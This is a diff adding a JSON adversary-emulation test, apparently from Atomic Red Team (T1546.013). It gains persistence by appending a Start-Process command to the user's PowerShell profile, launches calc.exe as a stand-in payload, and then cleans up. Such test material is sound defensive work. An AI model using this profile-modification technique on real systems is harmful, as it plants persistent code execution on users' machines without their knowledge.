@@ -1,0 +1,111 @@
+{
+  "id": "090e5aa5-32b6-473b-a49b-21e843a56896",
+  "name": "Append malicious start-process cmdlet",
+  "description": "Appends a start process cmdlet to the current user's powershell profile pofile that points to a malicious executable. Upon execution, calc.exe will be launched.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "5cdbe444-1b3c-4f01-ac03-05607830cb5c",
+      "type": "execute-command",
+      "data": {
+        "command": "Add-Content #{ps_profile} -Value \"\"\nAdd-Content #{ps_profile} -Value \"Start-Process #{exe_path}\"\npowershell -Command exit\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "208c7827-2263-446c-98aa-d2e5247d79a2",
+      "type": "execute-command",
+      "data": {
+        "command": "$oldprofile = cat $profile | Select-Object -skiplast 1\nSet-Content $profile -Value $oldprofile\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ff871bea-a727-4209-a703-b38bf6e1b10a",
+      "name": "Check dependency 1/1",
+      "description": "Ensure a powershell profile exists for the current user\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path #{ps_profile}) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "d4e9a4e0-b936-4a1a-b443-62fa8f8e01ec",
+      "name": "Resolve dependency 1/1",
+      "description": "Ensure a powershell profile exists for the current user\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Path #{ps_profile} -Type File -Force\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "bd713aed-6cad-40e1-a22f-a1d1d37b7504",
+      "name": "Re-check dependency 1/1",
+      "description": "Ensure a powershell profile exists for the current user\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path #{ps_profile}) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "5cdbe444-1b3c-4f01-ac03-05607830cb5c",
+      "p": "on-success",
+      "o": "208c7827-2263-446c-98aa-d2e5247d79a2"
+    },
+    {
+      "s": "5cdbe444-1b3c-4f01-ac03-05607830cb5c",
+      "p": "on-failure",
+      "o": "208c7827-2263-446c-98aa-d2e5247d79a2"
+    },
+    {
+      "s": "ff871bea-a727-4209-a703-b38bf6e1b10a",
+      "p": "on-success",
+      "o": "5cdbe444-1b3c-4f01-ac03-05607830cb5c"
+    },
+    {
+      "s": "ff871bea-a727-4209-a703-b38bf6e1b10a",
+      "p": "on-failure",
+      "o": "d4e9a4e0-b936-4a1a-b443-62fa8f8e01ec"
+    },
+    {
+      "s": "d4e9a4e0-b936-4a1a-b443-62fa8f8e01ec",
+      "p": "on-success",
+      "o": "bd713aed-6cad-40e1-a22f-a1d1d37b7504"
+    },
+    {
+      "s": "bd713aed-6cad-40e1-a22f-a1d1d37b7504",
+      "p": "on-failure",
+      "o": "5cdbe444-1b3c-4f01-ac03-05607830cb5c"
+    }
+  ],
+  "tags": [
+    "T1546.013",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "exe_path",
+      "type": "path",
+      "description": "Path the malicious executable",
+      "value": "calc.exe"
+    },
+    {
+      "name": "ps_profile",
+      "type": "string",
+      "description": "Powershell profile to use",
+      "value": "$profile"
+    }
+  ]
+}
